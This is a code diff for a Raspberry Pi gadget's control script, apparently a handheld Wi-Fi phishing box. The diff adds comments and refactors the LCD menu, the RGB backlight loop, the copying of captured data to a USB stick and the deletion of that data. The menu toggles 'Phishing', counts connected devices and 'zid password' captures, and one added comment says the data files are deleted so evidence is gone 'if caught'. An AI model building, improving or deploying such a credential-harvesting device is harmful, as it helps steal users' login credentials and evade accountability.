@@ -25,11 +25,17 @@ def backlight():
     keys_lp2 = ["R","G","B"]
     #make RGB Colour Cycle
     for i in range(0, 3):
+        #this two loop is same, two loops just for the RGB Colour Cycle
+
         while RGB[keys_lp1[i]] < 255:
+            #Detect the state of the switch behind the box
             swich_Mode()
             if mode != 0: break
+            #Switch the screen display content according to the state of the knob
             swich_typ()
+            #change the colour of the screen
             setRGB(RGB["R"],RGB["G"],RGB["B"])
+            #Detect the state of the button above the box, and act according to the state of the button.
             button_read_and_switch()
             time.sleep(0.001)
             RGB[keys_lp1[i]] += 1
@@ -54,8 +60,10 @@ def swich_Mode():
     mode = _dig_input(swich_pin)
 
 def settext_screen():
+    #Set the text that displayed on the screen
     setText_norefresh(output_wifi_status())
 
+#Returns the specified content according to the different states of "typ"
 def output_wifi_status():
     global typ
     typ = int(typ)
@@ -63,13 +71,14 @@ def output_wifi_status():
         #if Phishing is off
         if(get_wifi_status() == 0): return "push button to turn on Phishing"
         return "push button to turn off Phishing"
-    if typ == 2: return f"Num connecting {str(get_number_of_connected())}"
+    if typ == 2: return "Num connecting" + str(get_number_of_connected())
     if typ == 3: return "Num zid received " + str(get_number_of_zid_password())
     if typ == 4: return "Get data"
     if typ == 5: return "Clear Acquired Data"
     if typ == 6: return "poweroff ?"
     return"N/O"
 
+#Detect the state of the knob to change "typ"
 def swich_typ():
     button = 2
     global typ
@@ -89,32 +98,34 @@ def swich_typ():
         settext_screen()
     typ = curr_typ
 
+#Write data.txt and data.json to the usb device and eject safely.
 def write_value_to_device():
+    #If no data is currently obtained, do not write to the usb device.
     if int(get_number_of_zid_password()) == 0: return "No data"
-    succ = 0
+
     try: 
         #if usbdev Non-existent, create it
         run_command("sudo mkdir /home/pi/usbdev")
     except: 
         pass
+
+    #The usb device will be under /dev/sd[a,b,c]1 by default, in theory, will only run /dev/sda1, so this loop is just in case.
     for i in ["a","b","c"]:
         try:
             #mount usb device
             msg = run_command_with_error_message(f"sudo mount -o rw /dev/sd{i}1 /home/pi/usbdev")
 
-            #if mount success, write data to device
+            #if already mounted or mount successfully, write data to the usb device
             if(msg[0] == 0 or (msg[0] != 0 and msg[1].find("already mounted") == -1)):
                 run_command("sudo cp /home/pi/data.txt /home/pi/usbdev/")
                 run_command("sudo cp /home/pi/data.json /home/pi/usbdev/")
                 #eject usb device
                 run_command("sudo umount /home/pi/usbdev")
-                succ = 1;
-        except:
-            pass
-        if(succ == 1): break
+                #Returns success if the write is successful
+                return "success"
+        except:  pass
 
-    if succ == 0: return "no device"
-    return "success"
+    return "no device"
 
 def button_read_and_switch():
     button = 4
@@ -133,6 +144,7 @@ def button_read_and_switch():
     elif(read == 1 and typ == 5):   
         setText_norefresh("clearing")
         try:
+            #Deleting data files directly prevents evidence from being deleted if caught. <(*￣▽￣*)/
             run_command("sudo rm /home/pi/data.txt")
             run_command("sudo rm /home/pi/data.json")
             setText_norefresh("success")
